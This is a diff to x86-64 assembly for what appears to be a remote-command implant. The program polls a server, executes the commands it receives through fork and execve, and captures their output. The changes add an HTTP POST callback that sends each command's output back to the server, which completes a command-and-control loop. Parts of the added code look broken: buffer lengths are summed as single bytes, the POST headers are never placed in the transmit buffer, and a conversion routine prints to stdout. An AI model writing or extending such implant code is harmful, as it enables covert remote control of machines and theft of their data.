@@ -8,7 +8,13 @@ section .data
     err_msg_len dq 0x1c
     ; Http communication strings
     http_GET_msg db "GET / HTTP/1.1", 0x0D ,0x0A, 0x0D ,0x0A, 0x0           ; GET message
-    http_GET_msg_len db 0x12                ; Self-explanatory, really
+    http_GET_msg_len db 0x12                
+    ; HTTP POST needs content length to be adjusted every time
+    http_POST_msg db "POST / HTTP/1.1", 0x0D, 0x0A                          ; Start line
+                db "Content-Type: text/plain", 0x0D, 0x0A                   ; Content-Type header
+                db "Content-Length: "                                       ; Placeholder for length
+    http_POST_msg_len db 0x3b                                               
+    blank_line db 0x0D, 0x0A, 0x0D, 0x0A                                    ; Blank Line
     ; timespec struct
     sleep_time dq 0                         ; seconds     
     sleep_nsec dq 50000000                  ; nanoseconds (50ms)
@@ -27,6 +33,8 @@ section .bss
     cmd_buffer_old resb 0x100               ; Buffer to store last command
     argv resq 0x4                           ; Argument values for execve call
     pipe_fd resd 0x2                        ; pipe file descriptors for IPC
+    ascii_post_cl_number resb 0x15          ; ASCII content length for POST, 64 bit number
+    ascii_post_cl_decimal_cnt resb 1        ; To store the number of decimal digits
 
 section .text
     global _start
@@ -45,6 +53,8 @@ section .text
     global fn_make_pipe
     global fn_buffer_cmp
     global fn_cleanup
+    global fn_server_callback
+    global fn_itoa
 
 ; Function to exit
 fn_error_exit:
@@ -244,6 +254,74 @@ fn_make_pipe:
     pop rbp
     ret
 
+; Function to convert int from raw to ASCII
+; Parameters:
+;   rdi - integer to convert
+fn_itoa:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+    push rbx
+
+    lea rbx, [ascii_post_cl_number]     ; Point to the result buffer
+    add rbx, 20                         ; Start from the end of the buffer
+    mov byte [rbx], 0                   ; Null-terminate the string
+    
+    xor rcx, rcx
+.loop:
+    xor rdx, rdx                        ; Clear remainder
+    mov rax, rdi                        ; Load the number into RAX
+    mov rsi, 10                         ; Divisor (base 10)
+    div rsi                             ; Divide RAX by 10: RAX = quotient, RDX = remainder
+    add dl, '0'                         ; Convert remainder to ASCII ('0' + remainder)
+    dec rbx                             ; Move backward in the buffer
+    mov [rbx], dl                       ; Store the ASCII character
+
+    inc rcx                             ; Increment digit count
+    mov rdi, rax                        ; Load the quotient back into RDI
+    cmp rax, 0x0                        ; Check if quotient is zero
+    jnz .loop                           ; Repeat until the number is fully converted
+
+    ; Store decimal count
+    mov byte [ascii_post_cl_decimal_cnt], cl
+
+    mov rax, 1                  ; syscall: write
+    mov rdi, 1                  ; stdout
+    lea rsi, [ascii_post_cl_number]
+    mov r9, 0x14
+    sub r9b, byte [ascii_post_cl_decimal_cnt]
+    add rsi, r9
+    movzx rdx, byte [ascii_post_cl_decimal_cnt] ; Number of characters
+    syscall
+
+    pop rbx
+    mov rsp, rbp
+    pop rbp
+    ret
+    
+; Function to send POST and data to the server
+fn_server_callback:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+
+    ; Copy blank line to the end of the tx buffer
+    lea rdi, [tx_buffer]
+    add rdi, [tx_buffer_length]
+    sub rdi, 0x4
+    lea rsi, [blank_line]
+    mov rdx, 0x4
+    call fn_buffer_copy
+
+    ; Write to the socket
+    lea rsi, [tx_buffer]
+    mov rdx, qword [tx_buffer_length]
+    call fn_write_socket
+
+    mov rsp, rbp
+    pop rbp
+    ret
+
 ; Function that spawns a child process through fork syscall.
 ; Child executes command through execve syscall
 ; Pipes STDOUT of child process through to parent process
@@ -290,12 +368,25 @@ fn_exec_cmd:
 
     mov rdx, qword [rsp+8]      ; Copy number of bytes available from stack into rdx
 
-    mov [tx_buffer_length], rdx
+    ; Convert hex to ASCII
+    mov rdi, rdx
+    call fn_itoa
 
-    ; Read that much bytes
-    xor rax, rax                ; read syscall
-    mov edi, dword [pipe_fd]    ; pipe_fd[0]
-    lea rsi, [tx_buffer]        ; Load address of transmit buffer
+    ; Accomodate POST message
+    mov r9, rdx                                     ; Command output length
+    add r9b, byte [http_POST_msg_len]                     ; Add POST message length to the buffer length
+    add r9b, byte [ascii_post_cl_decimal_cnt]             ; Add the number of decimal digits to the buffer length
+    add r9, 0x4                                     ; Blank line length
+    mov qword [tx_buffer_length], r9
+
+    sub r9, 0x4                                     ; Configure it for reading below
+
+    ; Read bytes from pipe with offset to tx_buffer to accomodate POST message
+    xor rax, rax                                    ; read syscall
+    mov edi, dword [pipe_fd]                      ; pipe_fd[0]
+    ; Load address of transmit buffer with offset
+    lea rsi, [tx_buffer]
+    add rsi, r9
     ; byte count already in rdx
     syscall
 
@@ -630,6 +721,9 @@ _start:
     call fn_buffer_copy
     mov rax, [cmd_buffer_length]        ; Copy buffer length
     mov [cmd_buffer_old_length], rax
+
+    ; Return output of command
+    call fn_server_callback
 
     mov qword [sleep_time], 0x2         ; Sleep 2 seconds
     call fn_sleep
